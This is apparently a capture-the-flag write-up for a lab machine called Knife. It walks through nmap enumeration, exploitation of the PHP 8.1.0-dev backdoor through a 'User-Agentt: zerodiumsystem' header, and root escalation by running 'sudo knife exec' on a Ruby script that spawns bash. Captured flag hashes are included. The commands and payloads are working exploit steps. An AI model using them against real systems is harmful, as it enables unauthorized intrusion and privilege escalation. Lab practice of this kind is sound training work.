@@ -1,0 +1,74 @@
+Knife Lab: Vulnerability: php-8.1.0-dev RCE condition exploit,  exposed root escalation via knife binary
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.88.29
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ 
+http://10.129.88.29/ 
+
+https://github.com/flast101/php-8.1.0-dev-backdoor-rce 
+
+
+
+james@knife:~$ cat user.txt
+cat user.txt
+6cc8eb335289add7bcf03844b565b37d
+
+We ran sudo -l and found that we can run the file “knife” with root privileges
+
+We noticed the knife file is also written in ruby which allowed us to create a exec script to give us a root level shell. 
+
+
+echo 'exec "/bin/bash"' > /tmp/shell.rb
+
+sudo knife exec /tmp/shell.rb
+
+Now to stabilize the shell:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+root.txt
+be8810064e70107ab91cb0fe39ed0d42
+
+Furthermore, we can also get in via modifying HTTP request:
+Burp suite repeater request:
+GET / HTTP/1.1
+Host: 10.129.88.29
+User-Agentt:zerodiumsystem('id');
+Content-Length: 235
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+Response in header:
+HTTP/1.1 200 OK
+Date: Tue, 02 Jul 2024 19:48:14 GMT
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/8.1.0-dev
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+Content-Length: 5866
+
+uid=1000(james) gid=1000(james) groups=1000(james)
+<!DOCTYPE html>
+<html lang="en" >
+
+uid=1000(james) gid=1000(james) groups=1000(james) indicates we can input malicious code via HTTP
+
